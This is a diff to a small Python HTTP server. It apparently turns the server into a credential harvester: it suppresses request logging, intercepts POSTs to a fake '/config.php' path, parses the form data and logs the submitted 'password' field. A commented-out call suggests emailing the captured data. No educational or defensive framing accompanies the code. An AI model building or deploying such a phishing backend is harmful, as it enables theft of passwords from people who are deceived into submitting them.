@@ -5,6 +5,7 @@ Usage::
     ./server.py [<port>]
 """
 from http.server import SimpleHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 import logging
 import smtplib
 
@@ -29,6 +30,9 @@ This is a test e-mail message.
 
 
 class S(SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass
+
     def _set_response(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -38,7 +42,12 @@ class S(SimpleHTTPRequestHandler):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
         post_body = post_data.decode('utf-8')
-        logging.info(f"POST request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_body}\n")
+        
+        if self.path == '/config.php':
+            #logging.info(f"POST request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_body}\n")
+            data = parse_qs(post_body)
+            logging.info(data)
+            logging.info(data['password'])
 
         # CHANGE
         # self.send_mail(post_body)
